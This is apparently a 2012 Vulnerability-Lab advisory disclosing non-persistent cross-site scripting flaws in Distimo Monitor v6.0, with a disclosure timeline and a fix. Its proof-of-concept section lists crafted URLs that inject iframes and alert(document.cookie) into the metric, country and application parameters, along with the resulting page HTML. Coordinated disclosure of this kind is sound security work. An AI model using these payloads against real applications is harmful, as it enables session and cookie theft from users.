Title:
======
Distimo Monitor 6.0 - Multiple Cross Site Vulnerabilities


Date:
=====
2012-07-05


References:
===========
http://www.vulnerability-lab.com/get_content.php?id=631


VL-ID:
=====
631


Common Vulnerability Scoring System:
====================================
2


Introduction:
=============
Distimo Monitor allows developers to track their daily download and revenue figures from all app stores in one convenient place. 
View application rankings in all countries, and benchmark your application(s) versus the competition and the rest of the market. 
No code-insert in the developer application is required. Distimo provides device manufacturers, carriers and developers with the 
best insight into the mobile app store market, in order to and steer their app strategy. Distimo Monitor is the free cross-
platform app store monitoring tool for developers.

(Copy of the Vendor Homepage: http://www.distimo.com/products/ )


Abstract:
=========
The Vulnerability Laboratory Research Team discovered multiple Cross Site Scripting vulnerabilities in the Distimo Monitor v6.0 application.


Report-Timeline:
================
2012-07-01:	Researcher Notification & Coordination
2012-07-02:	Vendor Notification
2012-07-04:	Vendor Response/Feedback
2012-07-05:	Vendor Fix/Patch
2012-07-05:	Public or Non-Public Disclosure



Status:
========
Published


Exploitation-Technique:
=======================
Remote


Severity:
=========
Medium


Details:
========
Multiple non persistent cross site scripting vulnerabilities are detected in the Distimo Monitor v6.0 application.
The vulnerability allows remote attackers to hijack website customer, moderator or admin sessions with medium or high required user 
inter action or local low privileged user account. The bugs are located in the  Downloads > Map or Revenue > Date with the bound 
vulnerable parameters metric, application & date. Successful exploitation can result in account steal, client side phishing & client-side 
content request manipulation. Exploitation requires medium or high user inter action & no privileged application user account.

Vulnerable Module(s):
				[+] Downloads > Map
				[+] Revenue > Date


Vulnerable Parameter(s):
				[+] metric
				[+] country
				[+] application


Proof of Concept:
=================
The non persistent cross site scripting vulnerabilities can be exploited by remote attackers with medium or high required 
user inter action & without required privileged user account. For demonstration or reproduce ...

PoC:

https://monitor.127.0.0.1:1338/downloads/date/metric:1/country:29/application:%22%3E%3Ciframe%20src=a%20onload=alert%28document.cookie%29%20%3C/appstore:1

https://monitor.127.0.0.1:1338/downloads/date/metric:1/country:%22%3E%3Ciframe%20src=a%20onload=alert%28document.cookie%29%20%3C/application:99/appstore:1

https://monitor.127.0.0.1:1338/downloads/map/metric:%3E%22%3Ciframe%20src=http://vuln-lab.com%3E+%3E%22%3Ciframe%20src=http://vuln-lab.com%3E

https://monitor.127.0.0.1:1338/revenue/date/application:99/country:%3E%22%3Ciframe%20src=http://vuln-lab.com%3E%3E%22%3Ciframe%20src=http://vuln-lab.com%3E

https://monitor.127.0.0.1:1338/revenue/date/application:%3E%22%3Ciframe%20src=http://vuln-lab.com%3E%3E%22%3Ciframe%20src=http://vuln-lab.com/country:30




Review:  Revenue

<div id="savePresetPopup" class="bigButton floatl" style="margin: 0px 0px 0px 12px;"><img src="/img/add.png"> Save View</div>
</div><div id="chartPageTabs"><a href="/revenue/date/application:%3E" <iframe="" src="http:/www.vuln-lab.com">
>"<iframe src="http:/www.vuln-lab.com" heigh="800" width="1000">/country:30" class="active">By Date</a><a 
href="/revenue/map/application:>"<[NON PERSISTENT SCRIPT CODE INJECT]>>"<[NON PERSISTENT SCRIPT CODE INJECT2] 
width=1000 heigh=800>/country:30" class="">By Country or Continent</a></div>		
</div>

Review: Application

</div><div id="chartPageTabs"><a href="/downloads/date/metric:1/country:29/application:
"><[NON PERSISTENT SCRIPT CODE INJECT]) </appstore:1" class="active">By Date</a>
<a href="/downloads/map/metric:1/country:29/application:"><[NON PERSISTENT SCRIPT CODE INJECT]) 
</appstore:1" class="">By Country or Continent</a></div>		
</div>

Review: Country

<div id="savePresetPopup" class="bigButton floatl" style="margin: 0px 0px 0px 12px;"><img src="/img/add.png" /> Save View</div>
</div><div id="chartPageTabs"><a href="/downloads/date/metric:1/country:29/application:"><[NON PERSISTENT SCRIPT CODE INJECT]) 
</appstore:" class="active">By Date</a><a href="/downloads/map/metric:1/country:29/application:">
<[NON PERSISTENT SCRIPT CODE INJECT]) </appstore:" class="">By Country or Continent</a></div>		
</div>


Solution:
=========
Update to Distimo Monitor v6.1 (https://monitor.distimo.com/support/releases)

Vulnerable Version(s): Distimo Monitor v6.0


Risk:
=====
The security risk of the non persistent cross site scripting vulnerabilities are estimated as low(+)|(-)medium.


Credits:
========
Vulnerability Laboratory [Research Team]  -   Benjamin Kunz Mejri (bkm@vulnerability-lab.com)


Disclaimer:
===========
The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties, 
either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business 
profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some 
states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation 
may not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases 
or trade with fraud/stolen material.

Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       - www.vulnerability-lab.com/register
Contact:    admin@vulnerability-lab.com 	- support@vulnerability-lab.com 	       - research@vulnerability-lab.com
Section:    video.vulnerability-lab.com 	- forum.vulnerability-lab.com 		       - news.vulnerability-lab.com
Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       - youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php

Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. 
Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other 
media, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, sourcecode, videos and 
other information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), 
modify, use or edit our material contact (admin@vulnerability-lab.com or support@vulnerability-lab.com) to get a permission.

    				   	Copyright © 2012 | Vulnerability Laboratory



-- 
VULNERABILITY RESEARCH LABORATORY
LABORATORY RESEARCH TEAM
CONTACT: research@vulnerability-lab.com

